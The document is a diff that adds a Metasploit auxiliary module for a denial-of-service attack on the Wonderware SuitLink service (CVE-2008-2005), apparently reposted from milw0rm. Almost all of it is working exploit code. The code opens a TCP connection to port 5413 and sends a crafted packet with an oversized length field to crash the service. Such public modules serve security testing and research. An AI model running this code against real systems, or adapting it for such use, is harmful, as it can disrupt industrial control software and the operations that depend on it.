@@ -1,0 +1,65 @@
+##
+# $Id: suitlink.rb $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+module Msf
+
+class Auxiliary::Dos::Windows::Wonderware::SuitLink < Msf::Auxiliary
+
+	include Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Wonderware SuitLink Denial of Service',
+			'Description'    => %q{
+				This module exploits a denial of service vulnerability
+				within the SuitLink service in Wonderware products.
+			},
+			'Author'         => [ 'belay tows' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 1 $',
+			'References'     =>
+				[
+					[ 'BID', '28974' ],
+					[ 'CVE', '2008-2005' ],
+				],
+			'DisclosureDate' => 'May 05 2008'))
+			
+			register_options([Opt::RPORT(5413),], self.class)
+	end
+
+	def run
+		connect
+
+		print_status("Sending DoS packet...")
+
+        dos_length = 0xBAADF00D
+
+		pkt =  "\xD5\xCF\xC7\xF8\x0B\xCD\xD3\x11\xAA\x10\x00\xA0\xC9\xEC\xFD\x9F"
+		pkt << Rex::Text.rand_text_alpha(0x14) + "\x00\x00"
+        pkt << [dos_length].pack("V")
+	
+        len = [pkt.length].pack("C")
+		sock.put(len)
+		
+		sock.put(pkt)
+
+        sleep 15 # wait to avoid thread shutdown event
+		
+		disconnect
+	end
+
+end
+end	
+
+# milw0rm.com [2008-09-17]
